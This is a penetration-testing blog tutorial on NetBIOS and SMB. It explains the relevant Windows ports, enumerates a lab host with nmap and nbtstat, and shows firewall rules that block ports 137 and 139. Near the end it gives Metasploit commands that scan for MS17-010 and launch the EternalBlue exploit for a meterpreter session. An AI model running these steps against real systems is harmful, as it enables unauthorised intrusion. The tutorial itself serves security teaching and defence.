<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/penetration-testing/" rel="category tag">Penetration Testing</a></span>            </div>
            <h1 class="post-title entry-title">NetBIOS and SMB Penetration Testing on Windows</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/netbios-and-smb-penetration-testing-on-windows/" rel="bookmark"><time class="entry-date published" datetime="2017-09-07T10:31:43+00:00">September 7, 2017</time><time class="updated" datetime="2025-05-31T09:40:25+00:00">May 31, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <h3 class="ai-optimize-7"><span style="color: #800000;">NetBIOS (Network Basic Input/Output System)</span></h3>
<p class="ai-optimize-8 ai-optimize-introduction"><span style="color: #000000;">NetBIOS is a service which allows communication between applications such as a printer or other computer in Ethernet or token ring network via NetBIOS name. (From Wikipedia)</span></p>
<p class="ai-optimize-9"><span style="color: #000000;">NetBIOS name is 16 digits long character assign to a computer in the workgroup by WINS for name resolution of an IP address into NETBIOS name.</span></p>
<h3 class="ai-optimize-10"><span style="color: #800000;">Workgroup VS Domain</span></h3>
<p class="ai-optimize-11"><span style="color: #000000;"><strong>Workgroup:</strong> It is a peer-to-peer network for a maximum of 10 computers in the same LAN or subnet. It has no Centralized Administration, which means no computer has control over another computer. Each user controls the resources and security locally on their system.</span></p>
<p class="ai-optimize-12"><span style="color: #000000;"><strong>Domain:</strong> It is a client/server network for up to 2000 computers anywhere in the world. The administrator manages the domain and its users and resources. A user with an account on the domain can log onto any computer system, without having the account on that computer.</span></p>
<h5 class="ai-optimize-13"><strong><span style="color: #000000;">NetBIOS provides three distinct services:</span></strong></h5>
<ol>
<li class="ai-optimize-14"><span style="color: #000000;">Name service (NetBIOS-NS) for name registration and resolution via port <strong>137</strong>.</span></li>
<li class="ai-optimize-15"><span style="color: #000000;">Datagram distribution service (NetBIOS-DGM) for connection less communication via port <strong>138</strong>.</span></li>
<li class="ai-optimize-16"><span style="color: #000000;">Session service (NetBIOS-SSN) for connection-oriented communication via port <strong>139</strong>.<strong> </strong></span></li>
</ol>
<table>
<tbody>
<tr>
<td width="213"><span style="color: #000000;"><strong>Port</strong></span></td>
<td width="213"><span style="color: #000000;"><strong>Protocol </strong></span></td>
<td width="213"><span style="color: #000000;"><strong>Service</strong></span></td>
</tr>
<tr>
<td width="213"><span style="color: #000000;">135</span></td>
<td width="213"><span style="color: #000000;">TCP</span></td>
<td width="213"><span style="color: #000000;">MS-RPC endpoint mapper</span></td>
</tr>
<tr>
<td width="213"><span style="color: #000000;">137</span></td>
<td width="213"><span style="color: #000000;">UDP</span></td>
<td width="213"><span style="color: #000000;">NetBIOS Name Service</span></td>
</tr>
<tr>
<td width="213"><span style="color: #000000;">138</span></td>
<td width="213"><span style="color: #000000;">UDP</span></td>
<td width="213"><span style="color: #000000;">NetBIOS Datagram Service</span></td>
</tr>
<tr>
<td width="213"><span style="color: #000000;">139</span></td>
<td width="213"><span style="color: #000000;">TCP</span></td>
<td width="213"><span style="color: #000000;">NetBIOS Session Service</span></td>
</tr>
<tr>
<td width="213"><span style="color: #000000;">445</span></td>
<td width="213"><span style="color: #000000;">TCP</span></td>
<td width="213"><span style="color: #000000;">SMB Protocol</span></td>
</tr>
</tbody>
</table>
<h5 class="ai-optimize-17"><span style="color: #000000;"><strong>Port 135:</strong> </span></h5>
<p class="ai-optimize-17"><span style="color: #000000;">It is used for Microsoft <strong>R</strong>emote <strong>P</strong>rocedure <strong>C</strong>all between client and server to listen to the query of the client. Basically, it is used for communication between client- client and server -client for sending messages.</span></p>
<p class="ai-optimize-18"><span style="color: #000000;"><strong>Port 137</strong><strong>: </strong>the name service operates on UDP port 137. The name service primitives offered by NetBIOS are:</span></p>
<ul>
<li class="ai-optimize-19"><span style="color: #000000;">Add name – registers a NetBIOS name.</span></li>
<li class="ai-optimize-20"><span style="color: #000000;">Add group name – registers a NetBIOS “group” name.</span></li>
<li class="ai-optimize-21"><span style="color: #000000;">Delete name – un-registers a NetBIOS name or group name.</span></li>
<li class="ai-optimize-22"><span style="color: #000000;">Find name – looks up a NetBIOS name on the network.</span></li>
</ul>
<p class="ai-optimize-23"><span style="color: #000000;"><strong>Port 138</strong>: Datagram mode is connectionless; the application is responsible for error detection and recovery. In NBT, the datagram service runs on UDP port 138. The datagram service primitives offered by NetBIOS are:</span></p>
<ul>
<li class="ai-optimize-24"><span style="color: #000000;">Send Datagram – send a datagram to a remote NetBIOS name.</span></li>
<li class="ai-optimize-25"><span style="color: #000000;">Send Broadcast Datagram – send a datagram to all NetBIOS names on the network.</span></li>
<li class="ai-optimize-26"><span style="color: #000000;">Receive Datagram – wait for a packet to arrive from a Send Datagram operation.</span></li>
<li class="ai-optimize-27"><span style="color: #000000;">Receive Broadcast Datagram – wait for a packet to arrive from a Send Broadcast Datagram operation.</span></li>
</ul>
<p class="ai-optimize-28"><span style="color: #000000;"><strong>Port 139</strong>: Session mode lets two computers establish a connection, allows messages to span multiple packets, and provides error detection and recovery. In NBT, the session service runs on TCP port 139.</span></p>
<p class="ai-optimize-29"><span style="color: #000000;">The session service primitives offered by NetBIOS are:</span></p>
<ul>
<li class="ai-optimize-30"><span style="color: #000000;">Call – opens a session to a remote NetBIOS name.</span></li>
<li class="ai-optimize-31"><span style="color: #000000;">Listen – listen for attempts to open a session to a NetBIOS name.</span></li>
<li class="ai-optimize-32"><span style="color: #000000;">Hang Up – close a session.</span></li>
<li class="ai-optimize-33"><span style="color: #000000;">Send – sends a packet to the computer on the other end of a session.</span></li>
<li class="ai-optimize-34"><span style="color: #000000;">Send No Ack – like Send, but doesn’t require an acknowledgment.</span></li>
<li class="ai-optimize-35"><span style="color: #000000;">Receive – wait for a packet to arrive from a Send on the other end of a session.</span></li>
</ul>
<p class="ai-optimize-36"><span style="color: #000000;"><strong>Port 445:</strong> It is used for SMB protocol (server message block) for sharing file between different operating system i.e. windows-windows, Unix-Unix and Unix-windows.</span></p>
<p class="ai-optimize-37"><span style="color: #000000;">For mail details read our previous article given below:-</span></p>
<ul>
<li class="ai-optimize-38"><span style="color: #000000;"><a href="http://www.hackingarticles.in/penetration-testing-in-smb-protocol-using-metasploit/">Penetration Testing in SMB Protocol using Metasploit</a></span></li>
<li class="ai-optimize-39"><span style="color: #000000;"><a href="http://www.hackingarticles.in/5-ways-to-hack-smb-login-password/">4 Ways to Hack SMB Login Password</a></span></li>
<li class="ai-optimize-40"><span style="color: #000000;"><a href="https://www.hackingarticles.in/multiple-ways-to-connect-remote-pc-using-smb-port/">4 ways to Connect Remote PC using SMB Port</a></span></li>
<li class="ai-optimize-41"><span style="color: #000000;"><a href="http://www.hackingarticles.in/hack-remote-windows-pc-using-dll-files-smb-delivery-exploit/">Hack Remote Windows PC using DLL Files (SMB Delivery Exploit)</a></span></li>
</ul>
<h4 class="ai-optimize-42"><span style="color: #000000;">Scanning open port for NETBIOS Enumeration</span></h4>
<p class="ai-optimize-43"><span style="color: #000000;">We are using nmap for scanning target network for open TCP and UDP ports and protocol.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -sT -sU 192.168.1.128</pre>
<p class="ai-optimize-44"><span style="color: #000000;">From the given image you can see that from the result of scan we found port <strong>137 </strong>is <strong>open</strong> for NetBIOS name services, moreover got MAC address of target system.</span></p>
<p class="ai-optimize-45"><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-QxQU4kt0DGY/WbEac1PSooI/AAAAAAAARM4/otxIKEI_5HQYagKf69ZN410tolnKlTIEACLcBGAs/s1600/1.png"/></span></p>
<h5 class="ai-optimize-46"><span style="color: #000000;"><strong>What will happen if the admin shares a folder in a network? </strong></span></h5>
<p class="ai-optimize-47"><span style="color: #000000;">Suppose we had given share permission to a specific folder (for example <strong>ignite</strong> as shown in given image) so that we can share that folder with another user in the local network then which port will involve in this process.</span></p>
<p class="ai-optimize-48"><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-Y9syWfmv914/WbEafIr-GBI/AAAAAAAARNY/JOH2LGIT71YrmDxVJAvb1nif3jgOXjSMACLcBGAs/s1600/2.png"/></span></p>
<p class="ai-optimize-49"><span style="color: #000000;">Now you can observe that we have got a link for our shared folder. Using that link, anyone can access this folder in that network, hence it means we must now activate a new port to establish a connection to access a shared folder on another system. Let’s find out.</span></p>
<p class="ai-optimize-50"><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-CucGn5ZPom0/WbEafkzHqQI/AAAAAAAARNc/k6eKG1Eqby8P1OCd8sTP81iSwBd6GPnRwCLcBGAs/s1600/3.png"/></span></p>
<p class="ai-optimize-51"><span style="color: #000000;">Now again taking the help of nmap for scanning the target one more time.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -sT -sU 192.168.1.128</pre>
<p class="ai-optimize-52"><span style="color: #000000;">From the result of scanning, you can observe that after sharing a folder we found <strong>port 135</strong>, <strong>139</strong> and<strong> 445</strong> get <strong>activated</strong>.</span></p>
<p class="ai-optimize-53"><span style="color: #000000;">Hence only by sharing a single folder in the network, three ports get opened simultaneously in the target system for communication with another system.</span></p>
<p class="ai-optimize-54"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-UWfsNt0G8HY/WbEafxFkDLI/AAAAAAAARNk/UpwuijBbDfoxqhKNw1_pUjTsvxUF0dy5QCLcBGAs/s1600/4.png"/></span></p>
<p class="ai-optimize-55"><span style="color: #000000;">Through <strong>computer &gt; properties</strong>, the user can view basic information about their computer.</span></p>
<p class="ai-optimize-56"><span style="color: #000000;">As you can perceive we are sharing the image of victims control panel home which is showing his system basic information such as computer name, workgroup and etc.</span></p>
<p class="ai-optimize-57"><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-OwyDbCXBDMY/WbEagENgN-I/AAAAAAAARNg/PxXClvvjfgUMbx8IIZM00poyBzGjtof5ACLcBGAs/s1600/5.png"/></span></p>
<p class="ai-optimize-58"><span style="color: #000000;">The same information can be enumerated with another system in that network using the following command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nbtstat -a 192.168.1.128</pre>
<p class="ai-optimize-59"><span style="color: #000000;">Hence you can read the information from inside NetBIOS remote machine name table we had enumerated the same information as shown in the above image.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-pZD8u8-rmE4/WbEm_bCdS8I/AAAAAAAAROY/SzS0PJW-tcYZNTRsqf3WcAd5LMvGmfGjgCLcBGAs/s1600/6.png"/></p>
<h3 class="ai-optimize-60"><span style="color: #800000;">Apply filter on port 135-139 with firewall</span></h3>
<p class="ai-optimize-61"><span style="color: #000000;">For increasing security of your system in your local network, you can add a filter on port 137 with help of window firewall. Because port series from <strong>135 to 139 are most vulnerable</strong> therefore administrator can block either whole series or a specific port.</span></p>
<p class="ai-optimize-62"><span style="color: #000000;">Select Inbound Rules and click on <strong>New Rule.</strong></span></p>
<p class="ai-optimize-63"><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-T-U3HohenAA/WbEag9iC3XI/AAAAAAAARNo/G-073QLu6nQuTiMBCSP7S--AufIKUeb2gCLcBGAs/s1600/7.png"/></span></p>
<p class="ai-optimize-64"><span style="color: #000000;">The select radio button for <strong>the port </strong>which will create a new rule that controls connections for a TCP or UDP port.</span></p>
<p class="ai-optimize-65"><span style="color: #000000;">Then click on <strong>next</strong>.</span></p>
<p class="ai-optimize-66"><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-ybi633CwK3Y/WbEahqToAsI/AAAAAAAARNs/LgO-CZf_HbU3zkcvXBmio3X7oZMxxZSHwCLcBGAs/s1600/8.png"/></span></p>
<p class="ai-optimize-67"><span style="color: #000000;">Select UDP port to apply the rule on it.</span></p>
<p class="ai-optimize-68"><span style="color: #000000;">Edit <strong>port 137</strong> as specific local port then click on next. Here you can add complete series also for example 135,137,138,139.</span></p>
<p class="ai-optimize-69"><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-QGICYPWISr8/WbEaiHDRJPI/AAAAAAAARN0/He1LcpHIttM1H-qqhjsm6X4I8QeCxafkgCLcBGAs/s1600/9.png"/></span></p>
<p class="ai-optimize-70"><span style="color: #000000;">Choose to <strong>Block the connection</strong> as an action to be taken when a connection matches the specified condition.</span></p>
<p class="ai-optimize-71"><span style="color: #000000;">Hence it will not allow traffic on port 137 for communication as a result if the attacker will scan the victim system he will not able to find the NetBIOS name of the target system.</span></p>
<p class="ai-optimize-72"><span style="color: #000000;">Click on <strong>next</strong>.</span></p>
<p class="ai-optimize-73"><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-trQN2wk07eA/WbEac6VtwMI/AAAAAAAARM8/pxd9bTxz8kMDuSPtZ3YHU3icVkPiHaoGgCLcBGAs/s1600/10.png"/></span></p>
<p class="ai-optimize-74"><span style="color: #000000;">At last, provide a caption to the new rule of your choice (as shown in image <strong>block nbtstat</strong>) and then click on <strong>Finish</strong> and you will see new filter/rule will be added into windows firewall.</span></p>
<p class="ai-optimize-75"><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-zE3hZye1lMI/WbEadNMBrbI/AAAAAAAARNA/eLQCvO793D0WyeIhZkh6xgLMxZFct0VEQCLcBGAs/s1600/11.png"/></span></p>
<p class="ai-optimize-76"><span style="color: #000000;">Now scan target system using the previous command</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nbtstat -a 192.168.1.128</pre>
<p class="ai-optimize-77"><span style="color: #000000;">This time it will not give any information related to NetBIOS. Form given image you can read the message “Host is not found.</span></p>
<p class="ai-optimize-78"><strong>Conclusion: </strong><span style="color: #000000;">Hence by blocking 137 admin has added a security level that will hide the NetBIOS name of his system (192.168.1.128) in the local network.</span></p>
<p class="ai-optimize-79"><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-zJiMVhO0jZ0/WbEadQs1KjI/AAAAAAAARNE/lWIAcY_a_dAcVHLGJdkekocHg_fWNkkbACLcBGAs/s1600/12.png"/></span></p>
<h4 class="ai-optimize-80"><span style="color: #000000;">Access Share folder via port 139</span></h4>
<p class="ai-optimize-81"><span style="color: #000000;">Now let’s try to access the shared folder of the target (192.168.1.128) using the run command prompt. </span><span style="color: #000000;">From given image, you can observe that we are able to access to ignite folder. It is</span><span style="color: #000000;"> possible due to service “NetBIOS session service” running on port 139. </span></p>
<p class="ai-optimize-82"><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-7e04fdczdyc/WbEad6ZK8CI/AAAAAAAARNM/iF1-yvVHiT8Krbyf1bQAOPEezeDF5FlfACLcBGAs/s1600/13.png"/></span></p>
<h4 class="ai-optimize-83"><span style="color: #000000;">Block port 139</span></h4>
<p class="ai-optimize-84"><span style="color: #000000;">Similarly again use firewall inbound rule to block <strong>port 139</strong>, so that we can verify its impact on sharing information between two or more system. This will add a new in the firewall to stop the traffic coming on port 139.</span></p>
<p class="ai-optimize-85"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-9hZ1dUFt9Vk/WbEadz3WmxI/AAAAAAAARNI/N-_hJ7h2CNEm_rpGtGvnYk7c9K7BaeVjQCLcBGAs/s1600/14.png"/></span></p>
<p class="ai-optimize-86"><span style="color: #000000;">Now again let’s try to access the shared folder of the target (192.168.1.128) when he blocks port 139 and figure out whether we can access the shared folder “ignite” or not using the run command prompt.</span></p>
<p class="ai-optimize-87"><span style="color: #000000;">From the given image, you can see that we can access the ignite folder when the admin blocks port 139 in his network.</span></p>
<p class="ai-optimize-88"><span style="color: #000000;"><strong>Conclusion: </strong>Although port 139 was blocked but still sharing was possible due to the running protocol on port 445. Hence by blocking port 137 and 139 admin has added a security level that will prevent NetBIOS session service as well as NetBIOS name service for NetBIOS enumeration.</span></p>
<p class="ai-optimize-89"><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-PbBGVi6znEY/WbEaeX0sogI/AAAAAAAARNQ/EfnzXTXRKgg-OOuj-fgqscuVQwjnZeNGACLcBGAs/s1600/15.png"/></span></p>
<p class="ai-optimize-90"><span style="color: #000000;">Mainly in many organizations, the network blocks port series from 135 to 139 for security reasons; therefore, users utilize port 445 for sharing data in the network.  Now identify whether it is vulnerable to MS17-010 using Metasploit as shown in the given image.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use auxiliary/scanner/smb/smb_ms17_010
msf auxiliary(smb_ms17_010) &gt; set rhosts 192.168.1.128
msf auxiliary(smb_ms17_010) &gt; set rport 445
msf auxiliary(smb_ms17_010) &gt; exploit</pre>
<p class="ai-optimize-91"><span style="color: #000000;">From the result we found a host is vulnerable to MS17-010, hence we can exploit the target easily.</span></p>
<p class="ai-optimize-92"><span style="color: #000000;">For more scanning method read our previous article from <a href="http://www.hackingarticles.in/3-ways-scan-eternal-blue-vulnerability-remote-pc/"><strong>here</strong></a>.</span></p>
<p class="ai-optimize-93"><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-KVEVl83PI40/WbEcdYuhmFI/AAAAAAAAROA/x9j1cDpovc4Y_qQWXIEkl0deeMDjYUvvwCLcBGAs/s1600/16.png"/></span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/windows/smb/ms17_010_eternalblue
msf exploit(ms17_010_eternalblue) &gt;set rhost 192.168.1.1.128
msf exploit(ms17_010_eternalblue) &gt;set rport 445
msf exploit(ms17_010_eternalblue) &gt;set lhost 192.168.1.115
msf exploit(ms17_010_eternalblue) &gt; exploit</pre>
<p class="ai-optimize-94"><span style="color: #000000;">This will exploit the target system and give a meterpreter session of the targeted system as shown in the given image.</span></p>
<p class="ai-optimize-95"><span style="color: #000000;"><strong>Conclusion: </strong>Enumeration plays an important role in network penetration testing because it will fetch out hidden information of a victim’s system as well as identify the weakness that may help in exploiting the system.</span></p>
<p class="ai-optimize-96"><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-sn7qvGnCSjs/WbEcrb2YfZI/AAAAAAAAROE/eB2raqVKCxcND8nFGKUdLbTbLijGzCqtQCLcBGAs/s1600/17.png"/></span></p>
<p class="ai-optimize-97"><span style="color: #000000;"><strong>Author</strong>: Aarti Singh is a Researcher and Technical Writer at Hacking Articles. An Information Security Consultant, Social Media and Gadgets Lover. Contact<a href="https://www.linkedin.com/in/aarti--singh/"><strong> here</strong></a></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
